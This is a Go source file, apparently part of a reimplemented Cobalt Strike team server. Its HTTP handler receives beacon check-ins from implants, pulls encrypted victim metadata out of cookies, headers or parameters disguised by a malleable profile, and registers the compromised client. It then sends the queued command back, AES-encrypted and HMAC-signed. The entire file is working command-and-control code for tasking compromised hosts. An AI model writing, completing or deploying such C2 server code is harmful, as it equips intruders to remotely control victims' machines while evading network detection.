package http

import (
	"NewCsTeamServer/client"
	"NewCsTeamServer/config"
	"NewCsTeamServer/crypt"
	"NewCsTeamServer/profile"
	"NewCsTeamServer/server/public"
	"NewCsTeamServer/task"
	"fmt"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"strings"
)

// HandleBeacon HTTP服务端处理Beacon请求
func HandleBeacon(c *gin.Context) {
	// 假设元数据在Cookie中
	var cookie string
	if len(profile.ProfileConfig.HttpGet.ServerHeader) > 0 {
		for _, header := range profile.ProfileConfig.HttpGet.ServerHeader {
			c.Header(header.Name, header.Value)
		}
	}
	switch profile.ProfileConfig.HttpGet.MetadataType { //判断条件好像有点多 TODO 慢慢兼容
	case "header":
		cookie = c.GetHeader(profile.ProfileConfig.HttpGet.MetadataTypeValue) //从指定header头中获取数据
	case "parameter":
		cookie = c.Query(profile.ProfileConfig.HttpGet.MetadataTypeValue) //从指定url参数中获取
	case "uri-append": //TODO,好像不太好实现
		//cookie = c.Param("uri-append")
	}
	cookie = strings.Replace(cookie, profile.ProfileConfig.HttpGet.MetadataPrepend, "", 1) //去掉迷惑信息
	cookie = strings.Replace(cookie, profile.ProfileConfig.HttpGet.MetadataAppend, "", 1)
	cookie = strings.Replace(cookie, " ", "+", -1) // 替换空格为加号
	fmt.Println("Cookie:", cookie)
	fmt.Println("Cookie加密方式:", profile.ProfileConfig.HttpGet.MetadataCrypt)
	decodeCookie, err := public.DecryptMultipleTypes([]byte(cookie), profile.ProfileConfig.HttpGet.MetadataCrypt)
	if err != nil {
		return
	}
	//cookie = base64.StdEncoding.EncodeToString(decodeCookie)
	// 解密元数据
	metadata, err := crypt.DecryptMetadata(decodeCookie)
	if err != nil {
		c.String(http.StatusBadRequest, "metadata decryption failed: %v", err)
		return
	}
	// 解析元数据
	clientinfo, err := crypt.ParseMetadata(c.ClientIP(), metadata)
	if err != nil {
		c.String(http.StatusBadRequest, "metadata parsing failed: %v", err)
		return
	}

	client.GlobalClientManager.AddClient(clientinfo)
	//fmt.Println("Decrypted metadata.InternalIP:", utils.Uint32ToIPString(clientinfo.InternalIP))
	if err != nil {
		c.String(http.StatusBadRequest, "metadata parsing failed: %v", err)
		return
	}
	// 提取签名和数据
	iv := config.Iv
	// 检查任务队列并下发任务
	taskdata, exists := clientinfo.TaskQueue.PopTask()
	if !exists {
		fmt.Println("No tasks available for client", clientinfo.ClientID)
		c.String(http.StatusOK, "%s", profile.ProfileConfig.HttpGet.OutPutPrepend+profile.ProfileConfig.HttpGet.OutPutAppend)
		return
	}
	// 加密任务数据
	taskPacket, err := task.BuildTaskPacket([]task.Task{taskdata})
	if err != nil {
		c.String(http.StatusInternalServerError, "task packet creation failed: %v", err)
		return
	}

	// 加密任务数据
	encryptedTask, err := crypt.AesEncrypt(taskPacket, clientinfo.AESKey, iv)
	if err != nil {
		c.String(http.StatusInternalServerError, "task encryption failed: %v", err)
		return
	}

	// 添加HMAC签名
	signature := crypt.AddHMAC(encryptedTask, clientinfo.HMACKey)
	responseData := append(encryptedTask, signature...) //TODO 根据profile配置加密任务数据
	retbody, err := public.EncryptMultipleTypes(responseData, profile.ProfileConfig.HttpGet.OutPutCrypt)
	if err != nil {
		c.String(http.StatusInternalServerError, "task encryption failed: %v", err)
		return
	}
	retbody = append([]byte(profile.ProfileConfig.HttpGet.OutPutPrepend), retbody...)
	retbody = append(retbody, []byte(profile.ProfileConfig.HttpGet.OutPutAppend)...)
	// 返回加密的任务数据
	c.Data(200, "application/octet-stream", retbody)
	log.Printf("Task sent to client %d: ID=%s, Type=%d, Content=%s", clientinfo.ClientID, taskdata.ID, taskdata.Type, taskdata.Content)
	return
}
